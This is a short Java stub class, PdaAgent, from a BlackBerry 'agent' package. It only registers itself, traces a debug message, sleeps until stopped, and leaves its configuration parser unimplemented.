package com.ht.rcs.blackberry.agent;

import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

public class PdaAgent extends Agent {
    static Debug debug = new Debug("PdaAgent", DebugLevel.VERBOSE);

    public PdaAgent(int AgentStatus) {
        super(Agent.AGENT_PDA, AgentStatus, true);
    }

    protected PdaAgent(int AgentStatus, byte[] confParams) {
        this(AgentStatus);
        Parse(confParams);
    }

    public void AgentRun() {
        debug.trace("run");
        this.SleepUntilStopped();

    }

    protected boolean Parse(byte[] confParameters) {
        // TODO Auto-generated method stub
        return false;
    }

}
